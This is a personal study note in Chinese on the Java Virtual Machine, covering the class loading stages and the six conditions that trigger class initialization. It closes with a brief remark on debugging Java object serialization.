3.JVM(Java Virtual Machine)，JRE的一部分，JVM主要工作是解释自己的指令集（即字节码）并映射到本地的CPU指令集和OS的系统调用。Java语言是跨平台运行的，不同的操作系统会有不同的JVM映射规则，使之与操作系统无关，完成跨平台性。

一个class文件想要执行，必须加载到jvm中。

![image-20230728164832298](./image/image-20230728164832298.png)

加载、验证、准备、初始化和卸载这五个阶段的顺序是确定的，类型的加载过程必须按 照这种顺序按部就班地开始，而解析阶段则不一定：它在某些情况下可以在初始化阶段之后再开始， 这是为了支持Java语言的运行时绑定特性

在六种情况下，类必须进行初始化（自然，在初始化之前，加载、验证、准备阶段也都会执行):

- 遇到new、getstatic、putstatic或invokestatic这四条字节码指令时，如果类型没有进行过初始 化，则需要先触发其初始化阶段
- 使用java.lang.reflect包的方法对类型进行反射调用的时候，如果类型没有进行过初始化，则需 要先触发其初始化。
- 当初始化类的时候，如果发现其父类还没有进行过初始化，则需要先触发其父类的初始化
- 当虚拟机启动时，用户需要指定一个要执行的主类（包含main()方法的那个类），虚拟机会先 初始化这个主类。
- 当使用JDK 7新加入的动态语言支持时，如果一个java.lang.invoke.MethodHandle实例最后的解 析结果为REF_getStatic、REF_putStatic、REF_invokeStatic、REF_newInvokeSpecial四种类型的方法句 柄，并且这个方法句柄对应的类没有进行过初始化，则需要先触发其初始化。
- 当一个接口中定义了JDK 8新加入的默认方法（被default关键字修饰的接口方法）时，如果有 这个接口的实现类发生了初始化，那该接口要在其之前被初始化

因为需要具体使用类，所以必须实例化





### 杂

调了很久的文件流，必须继承Ser接口，而且在最后readObject时候是在存在的类里面去找，和直接cat不一样，cat是直接把整个文件读取下来了，然后搞成类

